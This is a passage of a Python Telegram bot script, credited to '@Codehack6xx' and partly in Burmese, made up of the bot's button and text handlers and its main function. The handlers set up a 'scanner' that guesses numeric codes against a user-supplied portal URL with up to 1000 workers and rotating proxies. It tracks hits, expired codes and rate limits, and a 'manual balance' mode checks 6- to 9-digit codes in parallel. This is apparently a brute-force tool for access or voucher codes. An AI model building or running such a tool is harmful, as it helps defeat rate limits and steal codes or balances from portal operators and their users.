            f"  🔍  ရင်းမြစ်များမှ auto စစ်ဆေးရန်\n"
            f"  🔗  Manual URL ထည့်စစ်ရန်\n"
            f"  🗑️  proxies.txt ရှင်းရန်\n"
            f"{DIV}\n"
            f"  💫  ရွေးချယ်လိုက်ပါ...",
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )

    elif data == "proxy_check_auto":
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('task') and not pc['task'].done():
            await query.message.edit_text("⚠️ <b>Proxy check already running.</b>", parse_mode=ParseMode.HTML)
            return
        await query.message.edit_text("⏳ <b>Starting proxy check...</b>", parse_mode=ParseMode.HTML)
        asyncio.create_task(run_proxy_check(context, query.message.chat_id, user_id))

    elif data == "proxy_check_stop":
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('stop_event'):
            pc['stop_event'].set()
            await query.answer("🛑 Stopping & saving...")
        else:
            await query.answer("ℹ️ No proxy check running")

    elif data == "proxy_check_manual_url":
        ud['state'] = 'waiting_for_proxy_url'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text(
            f"🔗 <b>MANUAL PROXY URL</b> 🔗\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  💫  Proxy URL ကို ပို့ပေးပါ။\n"
            f"  📝  ဥပမာ - <code>https://example.com/proxies.txt</code>",
            parse_mode=ParseMode.HTML
        )

    elif data == "proxy_clear_file":
        pm = get_proxy_manager()
        pm.clear_file()
        await query.message.edit_text(
            f"🗑️ <b>CLEARED</b> 🗑️\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  ✅  proxies.txt ကို အကုန်ဖျက်ပြီးပါပြီ။\n"
            f"  🔀  Proxies  {ARROW}  <code>0/0</code>\n"
            f"{DIV}",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.HTML
        )

    elif data == "btn_manual_balance":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🔢 6", callback_data="mb_mode_num6"),
             InlineKeyboardButton(text="🔢 7", callback_data="mb_mode_num7"),
             InlineKeyboardButton(text="🔢 8", callback_data="mb_mode_num8"),
             InlineKeyboardButton(text="🔢 9", callback_data="mb_mode_num9")],
            [InlineKeyboardButton(text="⬅️  Back", callback_data="btn_back_main")]
        ])
        await query.message.edit_text(
            f"💳 <b>MANUAL BALANCE</b> 💳\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  💫  Code mode ကို ရွေးပါ...\n\n"
            f"  🔢  Number 6 / 7 / 8 / 9\n"
            f"{DIV}\n"
            f"  ⚡  Parallel processing (fast)\n"
            f"  📋  Auto split + filter",
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )

    elif data.startswith("mb_mode_"):
        mode = data.split("mb_mode_")[1]
        st = get_manual_balance_state(user_id)
        if mode == "num6":
            st['mode'] = "num6"; st['code_len'] = 6
        elif mode == "num7":
            st['mode'] = "num7"; st['code_len'] = 7
        elif mode == "num8":
            st['mode'] = "num8"; st['code_len'] = 8
        elif mode == "num9":
            st['mode'] = "num9"; st['code_len'] = 9
        st['state'] = 'waiting_for_codes'
        st['codes'] = []
        st['results'] = []
        ud['state'] = 'waiting_for_manual_codes'
        await query.message.edit_text(
            f"💳 <b>MANUAL BALANCE</b> 💳\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  ⚙️  Mode      {ARROW}  <code>{st['mode']}</code>\n"
            f"  📏  Length    {ARROW}  {st['code_len']} digit\n"
            f"  ⚡  Parallel  {ARROW}  {MANUAL_CONCURRENCY}\n"
            f"{DIV}\n"
            f"  📥  Code များကို ယခုပို့ပါ\n\n"
            f"  💡  Auto split: space, newline, comma\n"
            f"  ✂️  Auto filter: {st['code_len']}-digit only\n"
            f"{DIV}\n"
            f"  📝  ဥပမာ:\n"
            f"     <code>740264 551342 127115</code>",
            parse_mode=ParseMode.HTML
        )

    elif data == "btn_set_workers":
        ud['state'] = 'waiting_for_workers'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text(
            f"👷✨ <b>SET WORKERS</b> ✨👷\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  📊  Current  {ARROW}  <code>{ud['num_workers']}</code>\n"
            f"  💡  Range    {ARROW}  1 - 1000\n"
            f"{DIV}\n"
            f"  ✏️  Enter new number:",
            parse_mode=ParseMode.HTML
        )

    elif data == "btn_start_scanner":
        if not ud['portal_url']:
            await query.message.edit_text(
                f"❌ <b>Portal URL missing.</b>\n\n"
                f"  💡  Please do 🌐 Update Portal first.",
                parse_mode=ParseMode.HTML
            )
            return
        if ud['task'] and not ud['task'].done():
            ud['stop_event'].set()
            ud['dash_update_event'].set()
            ud['task'].cancel()
            try:
                await asyncio.wait_for(ud['task'], timeout=3.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                pass
            except Exception:
                pass
        ud['stop_event'].clear()
        ud['stats'] = {'tried':0, 'hits':0, 'expired':0, 'limits':0, 'start_time': time.time()}
        ud['valid_codes'] = []
        ud['limit_codes'] = []
        ud['tried_codes'] = set()
        ud['recent_logs'] = []
        ud['CURRENT_CODE'] = '----'
        ud['balance_queue'] = asyncio.Queue()
        await query.message.edit_text(
            f"{BOT_TAGLINE}\n"
            f"🚀✨ <b>STARTING SCANNER</b> ✨🚀\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  ⏳  Initializing...",
            parse_mode=ParseMode.HTML
        )
        ud['dash_msg_id'] = query.message.message_id
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == "stop_scan":
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        if ud['task'] and not ud['task'].done():
            ud['task'].cancel()

@admin_only
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get('state')
    text = update.message.text.strip()

    if state == 'waiting_for_portal_url':
        if not text.startswith("http"):
            await update.message.reply_text("❌ <b>Please send a valid http/https URL.</b>", parse_mode=ParseMode.HTML)
            return
        ud['portal_url'] = text
        ud['state'] = None
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(text)
        except Exception:
            pass
        msg = await update.message.reply_text(
            f"✅✨ <b>PORTAL SAVED</b> ✨✅\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  💾  Portal URL saved successfully.\n"
            f"{DIV}\n\n" + build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.HTML
        )
        ud['menu_msg_id'] = msg.message_id

    elif state == 'waiting_for_digit':
        if text in ud['char_set'] and len(text) == 1:
            ud['start_digit'] = text
        else:
            ud['start_digit'] = '0'
        ud['state'] = None
        msg = await update.message.reply_text(
            f"✅✨ <b>CUSTOM START SET</b> ✨✅\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  🔢  Start Digit  {ARROW}  <code>{ud['start_digit']}</code>\n"
            f"{DIV}\n\n" + build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.HTML
        )
        ud['menu_msg_id'] = msg.message_id

    elif state == 'waiting_for_workers':
        try:
            n = int(text)
            if 1 <= n <= 1000:
                ud['num_workers'] = n
                ud['state'] = None
                msg = await update.message.reply_text(
                    f"✅✨ <b>WORKERS UPDATED</b> ✨✅\n"
                    f"🍼  By @Codehack6xx\n"
                    f"{DIV}\n"
                    f"  👷  Workers  {ARROW}  <code>{n}</code>\n"
                    f"{DIV}\n\n" + build_menu_text(ud),
                    reply_markup=get_main_menu_markup(),
                    parse_mode=ParseMode.HTML
                )
                ud['menu_msg_id'] = msg.message_id
            else:
                await update.message.reply_text("❌ <b>Enter a number between 1-1000.</b>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ <b>Please send a number only.</b>", parse_mode=ParseMode.HTML)

    elif state == 'waiting_for_proxy_url':
        if not text.startswith("http"):
            await update.message.reply_text("❌ <b>Please send a valid http/https URL.</b>", parse_mode=ParseMode.HTML)
            return
        ud['state'] = None
        await update.message.reply_text("⏳ <b>Checking proxies from manual URL...</b>", parse_mode=ParseMode.HTML)
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('task') and not pc['task'].done():
            await update.message.reply_text("⚠️ <b>Proxy check already running.</b>", parse_mode=ParseMode.HTML)
            return
        asyncio.create_task(run_proxy_check(context, update.message.chat_id, user_id, sources=[text]))

    elif state == 'waiting_for_proxy_text':
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text("❌ <b>Proxy list is empty.</b>", parse_mode=ParseMode.HTML)
            return
        try:
            pm = get_proxy_manager()
            added = pm.add_proxies(lines)
            total, active = pm.stats()
            ud['state'] = None
            msg = await update.message.reply_text(
                f"✅✨ <b>PROXIES SAVED</b> ✨✅\n"
                f"🍼  By @Codehack6xx\n"
                f"{DIV}\n"
                f"  ➕  Added   {ARROW}  <code>{added}</code>\n"
                f"  📊  Total   {ARROW}  <code>{total}</code>\n"
                f"  ✅  Active  {ARROW}  <code>{active}</code>\n"
                f"{DIV}\n\n" + build_menu_text(ud),
                reply_markup=get_main_menu_markup(),
                parse_mode=ParseMode.HTML
            )
            ud['menu_msg_id'] = msg.message_id
        except Exception as e:
            await update.message.reply_text(f"❌ <b>Error:</b> {e}", parse_mode=ParseMode.HTML)

    elif state == 'waiting_for_manual_codes':
        st = get_manual_balance_state(user_id)
        expected_len = st['code_len']
        codes = split_codes(text, expected_len=expected_len)
        raw_all = split_codes(text, expected_len=None)
        skipped = len(raw_all) - len(codes)
        if not codes:
            await update.message.reply_text(
                f"❌ <b>No valid codes.</b>\n\n"
                f"  ⚙️  Mode      {ARROW}  <code>{st['mode']}</code>\n"
                f"  📏  Length    {ARROW}  {expected_len} digit\n"
                f"  📋  Raw codes {ARROW}  {len(raw_all)}\n"
                f"  ⏭️  All filtered out.",
                parse_mode=ParseMode.HTML
            )
            return
        st['codes'] = codes
        ud['state'] = None
        await update.message.reply_text(
            f"✅✨ <b>CODES RECEIVED</b> ✨✅\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  ⚙️  Mode       {ARROW}  <code>{st['mode']}</code>\n"
            f"  📋  Valid      {ARROW}  <b>{len(codes)}</b>\n"
            f"  ⏭️  Skipped    {ARROW}  {skipped}\n"
            f"  ⚡  Parallel   {ARROW}  {MANUAL_CONCURRENCY}\n"
            f"{DIV}\n"
            f"  ⏳  Auto check starting...",
            parse_mode=ParseMode.HTML
        )
        st['task'] = asyncio.create_task(
            run_manual_balance_check(context, update.message.chat_id, user_id)
        )

# ---------------- MAIN ----------------
def main():
    if len(sys.argv) > 1 and sys.argv[1] == "gen":
        generate_new_key_cli()
        return
        
    check_approval()
    start_web_server()
    bot_token = get_bot_token()
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f"{CYAN}[MAIN] 🔀 Proxy Manager: {active}/{total} active{RESET}")
    print(f"{MAGENTA}[MAIN] 👑 Owner: @Codehack6xx{RESET}")
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("addproxies", add_proxies_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print(f"{GREEN}[MAIN] 🚀 Bot is running...{RESET}")
    print(f"{YELLOW}Thank for using By Telegram @Codehack6xx{RESET}")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
